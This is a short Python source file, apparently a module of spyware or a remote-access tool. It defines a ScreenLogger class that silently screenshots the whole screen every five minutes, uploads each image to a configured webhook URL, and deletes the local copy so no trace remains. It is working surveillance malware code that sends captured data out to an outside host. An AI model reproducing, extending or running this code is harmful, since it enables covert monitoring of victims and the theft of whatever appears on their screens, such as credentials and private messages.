from utils import *

import time
import os
from PIL import ImageGrab

class ScreenLogger:
    def __init__(self, software_dir_name, webhook_url):
        self.software_dir_name = software_dir_name
        self.webhook_url = webhook_url
        self.log_file = os.path.join(get_logs_path(self.software_dir_name), "screen_log.png")
        self.interval = 300

    def log_screen(self):
        try:
            screen = ImageGrab.grab()
            screen.save(self.log_file)
            send_webhook(self.webhook_url, file={"screen_logs.png": open(self.log_file, "rb")})
            os.remove(self.log_file)
        except Exception as e:
            send_webhook(self.webhook_url, f"```❌ Error logging screen: {e}```")

    def start(self):
        while True:
            self.log_screen()
            time.sleep(self.interval)

